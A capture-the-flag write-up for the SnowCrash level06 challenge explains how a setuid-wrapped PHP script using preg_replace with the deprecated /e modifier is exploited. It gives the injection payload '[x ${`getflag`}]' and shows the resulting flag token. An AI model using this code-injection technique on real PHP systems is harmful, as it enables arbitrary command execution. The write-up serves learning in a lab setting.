## Level 06

## Clues

We have 2 file

```
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
level06@SnowCrash:~$
```

Once again, the executable have the setuid bit set, so this will be our door for the flag06 password.

This executable seems to be the output of the level06.php file.

So in order to undurstand it, lets look at it

```php
#!/usr/bin/php
<?php

function y($m) 
{ 
    $m = preg_replace("/\./", " x ", $m); 
    $m = preg_replace("/@/", " y", $m); 
    return $m; 
}

function x($y, $z) 
{ 
    $a = file_get_contents($y); 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a); 
    return $a; 
}

    $r = x($argv[1], $argv[2]); print $r;
?>

```

This is a php file, using regex, and it first call the function x with argv, take his content, and execute some regex parsing then prints out the result.

So lets trick it to make it execute the getflag command.


## Solution

We must undurstand this code in order to trick it, we see that there is many way to do so, so here is how i did.


In the code we see that it use a preg_replace with the flag ***e***

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

After a brief search on internet we found this :

```
The e modifier is a deprecated regex modifier which allows you to use PHP code within your regular expression. This means that whatever you parse in will be evaluated as a part of your program.
```

This means that every occurence in the result of the regex :
```
"/(\[x (.*)\])/e"
```

Will be replaced, and then executed as a php code like so :

```
"y(\"\\2\")"
```

So in order to make it execute getflag, we are going to respect the regex pattern, so that it will receive the getflag command.

```
level06@SnowCrash:~$ cat /tmp/a
[x ${`getflag`}]
level06@SnowCrash:~$ ./level06 /tmp/a
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

level06@SnowCrash:~$
```

And we have our flag.

This one was very complicated, since i had to learn regex, especially when it is using a depreacted version of it.


## What i learned

Regex and their utility

More vulnerabilites to be aware of

More curiosity